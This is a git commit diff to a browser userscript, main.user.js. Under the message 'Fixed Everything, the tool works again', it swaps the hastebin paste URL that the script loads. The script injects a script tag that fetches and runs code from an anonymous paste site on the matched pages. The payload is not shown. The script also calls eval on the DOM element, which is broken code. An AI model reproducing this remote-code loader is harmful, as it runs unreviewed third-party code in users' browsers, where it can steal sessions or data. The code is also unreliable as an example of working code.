1605094ba71e2f73d2e364fc56f7f5d4c91182c0
w3bOs <75303094+w3bOs@users.noreply.github.com>
2021-10-18 14:45:59 +0200

    Update main.user.js
    Fixed Everything, the tool works again

--- main.user.js
+++ main.user.js
@@ -9,8 +9,10 @@
 // @grant        none
 // ==/UserScript==
 
+// https://hastebin.com/wepuraveqi.js
+
 const script= document.createElement("script")
 script.type = "text/javascript"
-script.src = "https://hastebin.com/raw/nowinabiku"
+script.src = "https://hastebin.com/raw/wepuraveqi"
 document.head.appendChild(script)
 eval(script)
